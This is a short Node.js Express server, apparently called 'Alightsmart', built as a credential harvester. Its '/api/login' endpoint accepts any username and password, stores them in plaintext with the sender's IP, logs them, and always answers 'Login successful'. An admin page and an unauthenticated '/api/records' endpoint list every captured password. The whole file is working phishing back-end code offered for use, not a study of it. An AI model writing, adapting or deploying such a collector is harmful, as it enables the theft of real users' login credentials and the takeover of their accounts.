const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// In-memory storage (for demo only)
let loginRecords = [];

// Login endpoint
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ message: 'Username and password required' });
    }

    const record = {
        id: Date.now(),
        username,
        password,
        timestamp: new Date().toLocaleString(),
        ip: req.ip || 'Unknown'
    };

    loginRecords.push(record);
    console.log('🔐 New Login Recorded:', record);

    res.json({ success: true, message: 'Login successful' });
});

// Admin dashboard - View all credentials
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// API to get all records for admin
app.get('/api/records', (req, res) => {
    res.json(loginRecords);
});

// Optional: Clear records
app.post('/api/clear', (req, res) => {
    loginRecords = [];
    res.json({ message: 'All records cleared' });
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`🚀 Alightsmart server running on http://localhost:${PORT}`);
    console.log(`👉 Admin page: http://localhost:${PORT}/admin`);
});